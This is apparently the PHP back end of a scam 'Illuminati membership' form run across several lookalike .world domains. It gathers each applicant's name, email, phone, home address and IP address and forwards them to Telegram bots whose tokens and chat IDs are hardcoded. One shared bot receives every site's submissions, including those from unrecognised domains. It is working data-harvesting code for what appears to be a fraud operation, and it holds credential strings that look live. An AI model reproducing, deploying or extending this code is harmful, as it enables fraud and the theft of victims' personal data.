<?php
// =============================================
// 🔐 ILLUMINATI MEMBERSHIP FORM SUBMISSION SCRIPT
// =============================================

// === Domain-specific bot + redirect map ===
$site_map = [
    '127.0.0.1' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/index.html'
    ],
    
    'illuminatiofficial.world' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
    ],
    
    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],




    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],


    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
    ],

    // Add more domains as needed
];

// === Logger setup ===
$log_file = __DIR__ . '/membership_submission_log.txt';
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] $data\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === HTML escape function for Telegram ===
function escape_html($text) {
    return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8', false);
}

// === Telegram sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30
        ]);
        
        $result = curl_exec($ch);
        
        // Error logging
        if (curl_error($ch)) {
            logToFile("❌ Telegram cURL error: " . curl_error($ch), $GLOBALS['log_file']);
        } else {
            $response = json_decode($result, true);
            if (!isset($response['ok']) || $response['ok'] !== true) {
                logToFile("❌ Telegram API Error: " . ($response['description'] ?? 'Unknown Error'), $GLOBALS['log_file']);
            } else {
                logToFile("✅ Telegram message sent successfully.", $GLOBALS['log_file']);
            }
        }
        curl_close($ch);
    }
}

// === Main logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // === Extract and sanitize VISIBLE form fields ===
    $email = escape_html($_POST['EMAIL'] ?? 'Not provided');
    $first_name = escape_html($_POST['FNAME'] ?? 'Not provided');
    $last_name = escape_html($_POST['LNAME'] ?? 'Not provided');
    $full_name = trim("$first_name $last_name");
    
    $phone = escape_html($_POST['PHONE'] ?? 'Not provided');
    $street = escape_html($_POST['STREET'] ?? '');
    $city = escape_html($_POST['CITY'] ?? '');
    $state = escape_html($_POST['STATE'] ?? '');
    $zip = escape_html($_POST['ZIP'] ?? '');
    $country = escape_html($_POST['COUNTRY'] ?? '');
    
    // Build full address
    $address_parts = [];
    if (!empty($street)) $address_parts[] = $street;
    if (!empty($city)) $address_parts[] = $city;
    if (!empty($state)) $address_parts[] = $state;
    if (!empty($zip)) $address_parts[] = $zip;
    if (!empty($country)) $address_parts[] = $country;
    $full_address = implode(', ', $address_parts);
    
    // Checkbox handling (visible field)
    $terms_agreed = isset($_POST['_mc4wp_agree_to_terms']) ? '✅ Yes' : '❌ No';
    
    // === Get IP and timestamp ===
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    $timestamp = date("Y-m-d H:i:s");
    
    // === Get domain for verification ===
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed = parse_url($referer);
    $domain = $parsed['host'] ?? 'unknown';
    
    // === Create Telegram message ===
    $telegram_msg = "🔺 <b>New Illuminati Membership Application</b>\n\n" .
                   "👤 <b>Name:</b> $full_name\n" .
                   "📧 <b>Email:</b> $email\n" .
                   "📞 <b>Phone:</b> $phone\n" .
                   "🏠 <b>Address:</b> $full_address\n" .
                   "🌍 <b>Country:</b> $country\n" .
                   "✅ <b>Terms Agreed:</b> $terms_agreed\n\n" .
                   "🕒 <b>Time:</b> $timestamp\n" .
                   "🌐 <b>IP:</b> $ip\n" .
                   "🔗 <b>Domain:</b> $domain";
    
    // === Log and send ===
    logToFile("[$domain] Membership application from: $full_name ($email)", $log_file);
    
    if (isset($site_map[$domain])) {
        $config = $site_map[$domain];
        sendToBots($telegram_msg, $config['bots']);
        
        // Redirect to thank you page
        header("Location: " . $config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        
        // Fallback - still send to first configured domain if unauthorized domain
        $first_domain = array_key_first($site_map);
        if ($first_domain && !empty($site_map[$first_domain]['bots'])) {
            sendToBots($telegram_msg . "\n\n⚠️ <b>Warning:</b> From unauthorized domain: $domain", 
                      $site_map[$first_domain]['bots']);
        }
        
        // Redirect to default thank you page
        header("Location: https://illuminatiofficial.world/index.html");
        exit;
    }
} else {
    // Not a POST request
    http_response_code(405);
    echo "Method not allowed. This script only accepts POST requests.";
    exit;
}
?>
